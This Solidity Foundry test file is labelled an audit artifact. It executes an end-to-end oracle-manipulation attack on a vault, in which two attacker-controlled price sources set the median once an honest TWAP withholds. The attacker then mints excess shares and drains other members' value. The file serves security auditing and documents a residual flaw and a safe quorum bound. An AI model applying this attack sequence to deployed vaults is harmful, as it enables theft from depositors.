// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.26;

import {Test, stdStorage, StdStorage} from "forge-std/Test.sol";
import {VaultCore} from "../../src/VaultCore.sol";
import {OracleAggregator, IPriceSource, ChainlinkSourceAdapter} from "../retired/OracleAggregator.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {IOracleAggregator} from "../../src/interfaces/IOracleAggregator.sol";
import {UniswapV3TwapSource, IUniswapV3PoolMinimal} from "../retired/UniswapV3TwapSource.sol";
import {MockERC20, StubGovernance, StubFeeEngine, StubRegistry} from "../mocks/Mocks.sol";
import {MockAggregatorV3} from "../mocks/OracleSourceMocks.sol";

/// @notice A creator/attacker-controlled price source: it serves honest data throughout the
/// deposit phase and flips to a depressed quote with a single `set` (one SSTORE) at attack time.
/// This is the C-3(b) "hostage" mechanism — a listed source under the untrusted creator's control
/// — applied here to the C-4 depression rather than to a permanent brick.
contract AttackerSource is IPriceSource {
    uint256 public p;
    uint256 public t;

    constructor(uint256 p_, uint256 t_) {
        p = p_;
        t = t_;
    }

    function set(uint256 p_, uint256 t_) external {
        p = p_;
        t = t_;
    }

    function latestPrice() external view returns (uint256, uint256) {
        return (p, t);
    }
}

/// @notice A Uniswap V3 pool mock reproducing the REAL `Oracle.observe` semantics from v3-core
/// (copied verbatim from `AuditTwapSpotDegeneration.t.sol`). The point of using it here — rather
/// than a stub that returns a stale timestamp on command — is that the honest TWAP leg withholds
/// (`latestPrice() == (0,0)`) purely by the H-2 fix's OWN logic when the pool goes quiet past the
/// 5% live-tick ceiling. The k-reduction that hands the median to a source minority is therefore
/// produced by shipped code, not by test fiat.
contract C4FaithfulV3Pool {
    struct Obs {
        uint32 blockTimestamp;
        int56 tickCumulative;
        bool initialized;
    }

    address public token0;
    address public token1;
    uint24 public fee = 500;

    int24 public tick;
    uint16 public observationIndex;
    uint16 public observationCardinality;
    Obs[] public obsRing;

    constructor(address t0, address t1) {
        token0 = t0;
        token1 = t1;
    }

    /// @notice Write a linear history at `historicalTick` over `[startTs, endTs]`, then stop.
    function seedHistory(int24 historicalTick, uint32 startTs, uint32 endTs, uint32 step) external {
        delete obsRing;
        int56 cum = 0;
        uint32 t = startTs;
        obsRing.push(Obs(t, cum, true));
        while (t + step <= endTs) {
            cum += int56(historicalTick) * int56(uint56(step));
            t += step;
            obsRing.push(Obs(t, cum, true));
        }
        observationIndex = uint16(obsRing.length - 1);
        observationCardinality = uint16(obsRing.length);
        tick = historicalTick;
    }

    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool) {
        return (0, tick, observationIndex, observationCardinality, observationCardinality, 0, true);
    }

    function observations(uint256 index) external view returns (uint32, int56, uint160, bool) {
        if (index >= obsRing.length) return (0, 0, 0, false);
        Obs memory o = obsRing[index];
        return (o.blockTimestamp, o.tickCumulative, 0, o.initialized);
    }

    function _transform(Obs memory last, uint32 target) internal view returns (Obs memory) {
        uint32 delta = target - last.blockTimestamp;
        return Obs(target, last.tickCumulative + int56(tick) * int56(uint56(delta)), true);
    }

    function _observeSingle(uint32 time, uint32 secondsAgo) internal view returns (int56) {
        Obs memory newest = obsRing[observationIndex];
        if (secondsAgo == 0) {
            if (newest.blockTimestamp != time) newest = _transform(newest, time);
            return newest.tickCumulative;
        }
        uint32 target = time - secondsAgo;
        if (newest.blockTimestamp <= target) {
            if (newest.blockTimestamp == target) return newest.tickCumulative;
            return _transform(newest, target).tickCumulative;
        }
        Obs memory oldest = obsRing[0];
        require(oldest.blockTimestamp <= target, "OLD");
        for (uint256 i = obsRing.length; i > 0; --i) {
            Obs memory beforeOrAt = obsRing[i - 1];
            if (beforeOrAt.blockTimestamp <= target) {
                if (beforeOrAt.blockTimestamp == target) return beforeOrAt.tickCumulative;
                Obs memory atOrAfter = obsRing[i];
                uint32 obsDelta = atOrAfter.blockTimestamp - beforeOrAt.blockTimestamp;
                uint32 targetDelta = target - beforeOrAt.blockTimestamp;
                return beforeOrAt.tickCumulative
                    + ((atOrAfter.tickCumulative - beforeOrAt.tickCumulative) / int56(uint56(obsDelta)))
                    * int56(uint56(targetDelta));
            }
        }
        revert("OLD");
    }

    function observe(uint32[] calldata secondsAgos)
        external
        view
        returns (int56[] memory tickCumulatives, uint160[] memory sl)
    {
        tickCumulatives = new int56[](secondsAgos.length);
        sl = new uint160[](secondsAgos.length);
        for (uint256 i; i < secondsAgos.length; ++i) {
            tickCumulatives[i] = _observeSingle(uint32(block.timestamp), secondsAgos[i]);
        }
    }
}

/// @notice AUDIT ARTIFACT — not a protocol test. **C-4 END-TO-END RE-VERIFICATION.**
///
/// The existing C-4 artifact (`AuditOracleToShareTheft.t.sol`) builds `VaultCore` over a
/// `MockOracle` and sets the depressed price DIRECTLY — it proves the VaultCore half and takes
/// the ~96% depression as GIVEN. The report (§C-4, "Scope of this confirmation") states the full
/// chain is "composed, not executed in one transaction", and infers closure from fixing
/// C-3/H-1/H-2/M-1.
///
/// This file replaces that inference with executed evidence. It stands up the REAL post-remediation
/// oracle stack — an `OracleAggregator` with 5 distinct, code-bearing sources (2 Chainlink push
/// adapters, 1 real `UniswapV3TwapSource` over a faithful v3 pool, 2 creator-controlled sources) at
/// quorum 3 — and asks whether a MINORITY attacker (2 of 5 sources) can still drive the aggregator's
/// reported `priceWad` to the depression C-4 needs, then feeds THAT price (never a value set
/// directly on the oracle) into a `VaultCore` deposit and measures the theft.
///
/// VERDICT (see the report handed back with this file):
///  - SAFE against ONE controlled source at any k >= quorum, and against TWO when all 5 are fresh.
///  - RESIDUAL: with TWO controlled sources, once a SINGLE honest leg withholds (k drops to 4), the
///    lower-median selection (`OracleAggregator.sol:131`, deliberately un-averaged) returns the
///    attacker's depressed quote. The withholding leg here is the honest TWAP going quiet — i.e.
///    the H-2 fix's fail-closed behaviour supplies the k-reduction the residual needs.
///  - The safe boundary this file establishes: `quorum >= 2*a + 1`, where `a` is the number of
///    sources one actor controls (Byzantine floor). At quorum 3 that means a <= 1. The shipped
///    remediation (`OracleAggregator.sol:73-75`; report H-1 remediation `:590`) specifies only a
///    FAULT-TOLERANCE floor (`m >= 5, quorum >= 3`, sound for benign withholdings) and is SILENT on
///    the Byzantine floor — the two are different numbers, and the shipped quorum of 3 tolerates
///    exactly ONE controlled source, which nothing in code or `assetConfig` states.
contract AuditC4EndToEndTest is Test {
    using stdStorage for StdStorage;

    uint256 constant USDC_1 = 1e6;
    address constant ASSET_KEY = address(0); // set to weth in setUp

    // Real oracle parameters (post-remediation floor).
    uint32 constant STALENESS = 3600; // aggregator per-asset freshness bound
    uint8 constant QUORUM = 3; // MIN_MEDIAN floor, strict majority of 5
    uint32 constant TWAP_WINDOW = 1800;
    uint32 constant TWAP_MAX_OBS_AGE = 90; // window/20 — the H-2-fixed ceiling
    uint16 constant TWAP_MIN_CARD = 30;
    int24 constant HONEST_TICK = -198000; // ~ $2500/wETH, wETH = token0

    uint256 constant HONEST_WAD = 2500e18;
    uint256 constant DEPRESSED_WAD = 100e18; // ~4% of honest — the 96% depression C-4 assumes

    MockERC20 usdc;
    MockERC20 weth;

    // The residual 5-source config priced into VaultCore.
    MockAggregatorV3 feed1;
    MockAggregatorV3 feed2;
    ChainlinkSourceAdapter cl1;
    ChainlinkSourceAdapter cl2;
    C4FaithfulV3Pool pool;
    UniswapV3TwapSource twap;
    AttackerSource att1;
    AttackerSource att2;
    OracleAggregator agg;

    StubGovernance gov;
    StubFeeEngine fees;
    StubRegistry registry;
    VaultCore vault;

    address creator = makeAddr("creator");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.warp(1_000_000);
        usdc = new MockERC20("USDC", 6);
        weth = new MockERC20("wETH", 18);
        gov = new StubGovernance();
        fees = new StubFeeEngine();
        registry = new StubRegistry();

        // ── the real oracle stack ────────────────────────────────────────────
        // Two Chainlink push adapters (8-decimal feeds → WAD).
        feed1 = new MockAggregatorV3(8, int256(2500e8), block.timestamp);
        feed2 = new MockAggregatorV3(8, int256(2500e8), block.timestamp);
        cl1 = new ChainlinkSourceAdapter(IAggregatorV3(address(feed1)));
        cl2 = new ChainlinkSourceAdapter(IAggregatorV3(address(feed2)));

        // One real TWAP source over a faithful v3 pool, seeded to serve the window today.
        pool = new C4FaithfulV3Pool(address(weth), address(usdc));
        _seedPool();
        twap = new UniswapV3TwapSource(
            address(weth),
            address(usdc),
            IUniswapV3PoolMinimal(address(pool)),
            IUniswapV3PoolMinimal(address(0)),
            TWAP_WINDOW,
            TWAP_MIN_CARD,
            TWAP_MAX_OBS_AGE
        );

        // Two creator-controlled sources, honest at $2500 during the deposit phase.
        att1 = new AttackerSource(HONEST_WAD, block.timestamp);
        att2 = new AttackerSource(HONEST_WAD, block.timestamp);

        address[] memory srcs = new address[](5);
        srcs[0] = address(cl1);
        srcs[1] = address(cl2);
        srcs[2] = address(twap);
        srcs[3] = address(att1);
        srcs[4] = address(att2);
        agg = _buildAgg(srcs, QUORUM);

        // Sanity: the real stack prices wETH honestly with everyone fresh. With four sources at
        // exactly $2500 the median (index 2 of 5) is $2500 regardless of the TWAP's exact value.
        assertEq(agg.priceWad(address(weth)), HONEST_WAD, "honest 5-source median is $2500");

        // ── the vault, priced by the REAL aggregator (not a MockOracle) ───────
        address[] memory basket = new address[](1);
        basket[0] = address(weth);
        vault = new VaultCore(
            address(usdc),
            basket,
            creator,
            registry,
            gov,
            fees,
            agg, // <-- the real OracleAggregator, not a directly-set MockOracle
            0,
            10 * USDC_1,
            100,
            30 days,
            new address[](0),
            address(0)
        );

        for (uint160 i; i < 3; ++i) {
            address who = [creator, victim, attacker][i];
            usdc.mint(who, 10_000_000 * USDC_1);
            vm.prank(who);
            usdc.approve(address(vault), type(uint256).max);
        }
    }

    // ───────────────────────────── helpers ─────────────────────────────

    function _buildAgg(address[] memory srcs, uint8 quorum) internal returns (OracleAggregator) {
        address[] memory assets = new address[](1);
        assets[0] = address(weth);
        address[][] memory sources = new address[][](1);
        sources[0] = srcs;
        uint32[] memory staleness = new uint32[](1);
        staleness[0] = STALENESS;
        uint8[] memory q = new uint8[](1);
        q[0] = quorum;
        return new OracleAggregator(assets, sources, staleness, q);
    }

    /// @dev (Re)seed the TWAP pool with 2h of history ending at the current block — the state in
    /// which the source is fresh. Called after each warp during honest setup.
    function _seedPool() internal {
        pool.seedHistory(HONEST_TICK, uint32(block.timestamp - 7200), uint32(block.timestamp), 60);
    }

    /// @dev Re-stamp every honest leg to "now": Chainlink feeds keep publishing, the TWAP pool is
    /// re-seeded fresh, and the two creator sources serve honest $2500. Without this the 4h join
    /// window would leave every push source stale and trip the breaker before the attack — the
    /// existing MockOracle test never hit staleness because a MockOracle has none.
    function _refreshAllHonest() internal {
        feed1.set(int256(2500e8), block.timestamp);
        feed2.set(int256(2500e8), block.timestamp);
        _seedPool();
        att1.set(HONEST_WAD, block.timestamp);
        att2.set(HONEST_WAD, block.timestamp);
    }

    function _join(address who, uint256 amount) internal {
        vm.prank(who);
        vault.deposit(amount);
        skip(4 hours);
        _refreshAllHonest(); // honest feeds keep publishing across the window
        vault.activate(who);
    }

    /// @dev Stand in for a governed rebalance: move `usdcAmt` of idle into `wethAmt` of wETH.
    function _investIntoBasket(uint256 usdcAmt, uint256 wethAmt) internal {
        weth.mint(address(vault), wethAmt);
        uint256 curAsset = vault.assetBalance(address(weth));
        stdstore.target(address(vault)).sig("assetBalance(address)").with_key(address(weth))
            .checked_write(curAsset + wethAmt);
        uint256 curIdle = vault.idleUsdc();
        stdstore.target(address(vault)).sig("idleUsdc()").checked_write(curIdle - usdcAmt);
        vm.prank(address(vault));
        usdc.transfer(address(0xdead), usdcAmt);
    }

    // ═══════════════════════ boundary: what the code DOES guarantee ═══════════════════════

    /// @notice SAFE. With all five sources fresh, the two creator-controlled sources depressed to
    /// 4% cannot move the lower median — they are a minority of the fresh set and the honest three
    /// bracket the middle element. This is exactly the property H-1's fix was meant to restore, and
    /// it holds.
    function test_safe_allFiveFresh_twoControlledSourcesAreOutvoted() public {
        att1.set(DEPRESSED_WAD, block.timestamp);
        att2.set(DEPRESSED_WAD, block.timestamp);
        uint256 p = agg.priceWad(address(weth));
        assertGe(p, 1500e18, "median stays in the honest band, not the depression");
        assertTrue(p != DEPRESSED_WAD, "two low sources of five do not set the price");
    }

    /// @notice SAFE. A single controlled source cannot set the price at ANY fresh count down to the
    /// quorum. Here a=1 (four honest legs + one attacker). We withhold honest legs one at a time —
    /// the TWAP by going quiet (real H-2 logic), then a Chainlink by going stale — driving k from 5
    /// to 4 to 3. At every k the lower median remains honest, because one attacker can never be a
    /// majority of a set of size >= 3. THIS is the guarantee the code delivers: `quorum >= 2*a+1`
    /// with a = 1 is satisfied at quorum 3.
    function test_safe_oneControlledSource_medianHoldsAsHonestLegsWithhold() public {
        // Fresh a=1 config: cl1, cl2, a third honest feed, the TWAP, one attacker source.
        MockAggregatorV3 feed3 = new MockAggregatorV3(8, int256(2500e8), block.timestamp);
        ChainlinkSourceAdapter cl3 = new ChainlinkSourceAdapter(IAggregatorV3(address(feed3)));
        C4FaithfulV3Pool pool2 = new C4FaithfulV3Pool(address(weth), address(usdc));
        pool2.seedHistory(HONEST_TICK, uint32(block.timestamp - 7200), uint32(block.timestamp), 60);
        UniswapV3TwapSource twap2 = new UniswapV3TwapSource(
            address(weth),
            address(usdc),
            IUniswapV3PoolMinimal(address(pool2)),
            IUniswapV3PoolMinimal(address(0)),
            TWAP_WINDOW,
            TWAP_MIN_CARD,
            TWAP_MAX_OBS_AGE
        );
        AttackerSource lone = new AttackerSource(DEPRESSED_WAD, block.timestamp); // attacker is LOW

        MockAggregatorV3 f1 = new MockAggregatorV3(8, int256(2500e8), block.timestamp);
        MockAggregatorV3 f2 = new MockAggregatorV3(8, int256(2500e8), block.timestamp);
        ChainlinkSourceAdapter c1 = new ChainlinkSourceAdapter(IAggregatorV3(address(f1)));
        ChainlinkSourceAdapter c2 = new ChainlinkSourceAdapter(IAggregatorV3(address(f2)));

        address[] memory srcs = new address[](5);
        srcs[0] = address(c1);
        srcs[1] = address(c2);
        srcs[2] = address(cl3);
        srcs[3] = address(twap2);
        srcs[4] = address(lone);
        OracleAggregator a = _buildAgg(srcs, QUORUM);

        // k = 5: honest median.
        assertEq(a.priceWad(address(weth)), HONEST_WAD, "k=5, a=1: honest median");

        // k = 4: TWAP withholds (pool quiet past window/20). Keep the push feeds fresh.
        skip(200);
        f1.set(int256(2500e8), block.timestamp);
        f2.set(int256(2500e8), block.timestamp);
        feed3.set(int256(2500e8), block.timestamp);
        lone.set(DEPRESSED_WAD, block.timestamp);
        // fresh = {2500, 2500, 2500, 100}; sorted [100,2500,2500,2500]; index 1 = 2500.
        assertEq(a.priceWad(address(weth)), HONEST_WAD, "k=4, a=1: one low source still outvoted");

        // k = 3: additionally starve one Chainlink (do not refresh f1).
        f2.set(int256(2500e8), block.timestamp);
        feed3.set(int256(2500e8), block.timestamp);
        lone.set(DEPRESSED_WAD, block.timestamp);
        // fresh = {2500, 2500, 100}; sorted [100,2500,2500]; index 1 = 2500.
        assertEq(a.priceWad(address(weth)), HONEST_WAD, "k=3, a=1: median is still honest");
    }

    /// @notice RESIDUAL — the counterexample. TWO controlled sources, and a SINGLE honest leg (the
    /// TWAP) withholds because its pool went quiet. k drops from 5 to 4, and the lower median of
    /// {2500, 2500, 100, 100} is `fresh[1] == 100`. The attacker minority (2 of 5 configured
    /// sources) now sets the price outright — a full source short of the boundary the report
    /// implies. The withholding is produced by the H-2 fix's own fail-closed path, not by fiat.
    function test_residual_twoControlledSources_oneHonestWithholds_k4_setsDepressedPrice() public {
        skip(200); // pool quiet past window/20 → TWAP withholds
        feed1.set(int256(2500e8), block.timestamp); // honest push feeds keep publishing
        feed2.set(int256(2500e8), block.timestamp);
        att1.set(DEPRESSED_WAD, block.timestamp); // attacker flips both controlled sources
        att2.set(DEPRESSED_WAD, block.timestamp);

        // Confirm the TWAP genuinely withheld (k really is 4, by real code).
        (uint256 tp, uint256 tts) = twap.latestPrice();
        assertEq(tp, 0, "honest TWAP withholds on the quiet pool");
        assertEq(tts, 0, "and casts no vote");

        assertEq(agg.priceWad(address(weth)), DEPRESSED_WAD, "k=4 lower median = attacker's 4% quote");
    }

    /// @notice RESIDUAL, deeper: with two honest legs gone (TWAP quiet + one Chainlink stale) the
    /// depression holds at k = 3 as well — sorted [100,100,2500], index 1 = 100.
    function test_residual_twoControlledSources_k3_setsDepressedPrice() public {
        skip(200);
        feed2.set(int256(2500e8), block.timestamp); // only ONE honest push feed refreshed
        att1.set(DEPRESSED_WAD, block.timestamp);
        att2.set(DEPRESSED_WAD, block.timestamp);
        // feed1 left stale, TWAP quiet ⇒ fresh = {2500(feed2), 100, 100}.
        assertEq(agg.priceWad(address(weth)), DEPRESSED_WAD, "k=3 lower median = attacker's 4% quote");
    }

    /// @notice The hostile config is fully CONSTRUCTIBLE: 5 distinct, code-bearing addresses, a
    /// quorum of 3 (>= MIN_MEDIAN and a strict majority of 5). M-1's distinctness loop and H-1's
    /// quorum floor both PASS. This is the executed evidence that no code-level validation reaches
    /// the defect — it lives entirely in the (unenforceable) assumption that at most one of the
    /// five sources is attacker-controlled.
    function test_hostileConfigPassesEveryConstructorCheck() public view {
        (address[] memory s, uint32 st, uint8 q) = agg.assetConfig(address(weth));
        assertEq(s.length, 5, "five sources accepted");
        assertEq(st, STALENESS, "staleness within ceiling");
        assertEq(q, QUORUM, "quorum 3 accepted - MIN_MEDIAN and strict-majority both satisfied");
    }

    // ═══════════════════ end to end: real aggregator → excess shares → theft ═══════════════════

    /// @notice THE FULL CHAIN, executed. The depressed NAV is read from the REAL `OracleAggregator`
    /// (median of live sources), not set on the oracle directly. An existing member deposits while
    /// the aggregator reports the depressed price, mints excess shares in the same transaction, and
    /// the value comes out of the other members once the price recovers.
    function test_c4EndToEnd_realAggregatorDepressionMintsExcessSharesAndDrainsMembers() public {
        _join(creator, 1_000_000 * USDC_1);
        _join(victim, 1_000_000 * USDC_1);
        _investIntoBasket(2_000_000 * USDC_1, 800e18); // 800 wETH @ $2500 = $2,000,000

        assertEq(vault.navWad(), 2_000_000e18, "NAV is $2.0m before the attack (priced by real agg)");

        _join(attacker, 10 * USDC_1); // pre-clear the observation window, cheaply and in the open

        uint256 victimShares = vault.sharesOf(victim);
        uint256 navBefore = vault.navWad();
        uint256 supplyBefore = vault.totalShares();
        uint256 victimValueBefore = navBefore * victimShares / supplyBefore;

        // ── depression via the REAL oracle path ──────────────────────────────
        // Market quiet → honest TWAP withholds (k=4); the two creator sources flip low. The
        // aggregator's OWN median math now reports the depression — nothing is set on it directly.
        skip(200);
        feed1.set(int256(2500e8), block.timestamp);
        feed2.set(int256(2500e8), block.timestamp);
        att1.set(DEPRESSED_WAD, block.timestamp);
        att2.set(DEPRESSED_WAD, block.timestamp);
        assertEq(agg.priceWad(address(weth)), DEPRESSED_WAD, "aggregator itself reports the depression");

        uint256 attackCapital = 1_000_000 * USDC_1;
        vm.prank(attacker);
        vault.deposit(attackCapital); // mints IMMEDIATELY at the depressed NAV
        // ─────────────────────────────────────────────────────────────────────

        // Price recovers: creator sources back to honest; aggregator returns to $2500 (TWAP still
        // quiet, but the four remaining fresh sources are all $2500).
        att1.set(HONEST_WAD, block.timestamp);
        att2.set(HONEST_WAD, block.timestamp);
        feed1.set(int256(2500e8), block.timestamp);
        feed2.set(int256(2500e8), block.timestamp);
        assertEq(agg.priceWad(address(weth)), HONEST_WAD, "price recovered via the real aggregator");

        uint256 navAfter = vault.navWad();
        uint256 supplyAfter = vault.totalShares();
        uint256 attackerValue = navAfter * vault.sharesOf(attacker) / supplyAfter;
        uint256 victimValueAfter = navAfter * victimShares / supplyAfter;

        emit log_named_uint("attacker capital in   (USDC)", attackCapital);
        emit log_named_uint("attacker claim out    (USD, WAD)", attackerValue);
        emit log_named_uint("victim value before   (USD, WAD)", victimValueBefore);
        emit log_named_uint("victim value after    (USD, WAD)", victimValueAfter);

        assertGt(attackerValue, attackCapital * 1e12 * 2, "attacker claim > 2x capital deposited");
        assertLt(victimValueAfter, victimValueBefore / 2, "victim lost more than half their value");

        uint256 attackerGain = attackerValue - attackCapital * 1e12;
        emit log_named_uint("attacker gain (WAD)", attackerGain);
        assertGt(attackerGain, 0, "attack is profitable through the real oracle path");
    }

    /// @notice The in-kind exit realises the stolen value as real tokens, net of the 1% exit-fee
    /// cap — confirming the gain is not a paper-NAV artifact, with the price still sourced from the
    /// real aggregator throughout.
    function test_c4EndToEnd_attackerRealisesStolenValueInKind() public {
        _join(creator, 1_000_000 * USDC_1);
        _join(victim, 1_000_000 * USDC_1);
        _investIntoBasket(2_000_000 * USDC_1, 800e18);
        _join(attacker, 10 * USDC_1);

        skip(200);
        feed1.set(int256(2500e8), block.timestamp);
        feed2.set(int256(2500e8), block.timestamp);
        att1.set(DEPRESSED_WAD, block.timestamp);
        att2.set(DEPRESSED_WAD, block.timestamp);
        assertEq(agg.priceWad(address(weth)), DEPRESSED_WAD, "depression via real aggregator");

        vm.prank(attacker);
        vault.deposit(1_000_000 * USDC_1);

        att1.set(HONEST_WAD, block.timestamp);
        att2.set(HONEST_WAD, block.timestamp);
        feed1.set(int256(2500e8), block.timestamp);
        feed2.set(int256(2500e8), block.timestamp);

        uint256 wethBefore = weth.balanceOf(attacker);
        uint256 usdcBefore = usdc.balanceOf(attacker);

        uint256 attackerShares = vault.sharesOf(attacker);
        vm.prank(attacker);
        vault.requestExit(attackerShares); // Mode I: settles instantly, in kind

        uint256 wethOut = weth.balanceOf(attacker) - wethBefore;
        uint256 usdcOut = usdc.balanceOf(attacker) - usdcBefore;
        uint256 realisedUsd = wethOut * 2500e18 / 1e18 + usdcOut * 1e12;

        emit log_named_uint("wETH received by attacker", wethOut);
        emit log_named_uint("USDC received by attacker", usdcOut);
        emit log_named_uint("realised value (USD, WAD)", realisedUsd);

        assertGt(realisedUsd, (1_000_010e18 * 5) / 2, "attacker walks away with >2.5x capital, in kind");
    }
}
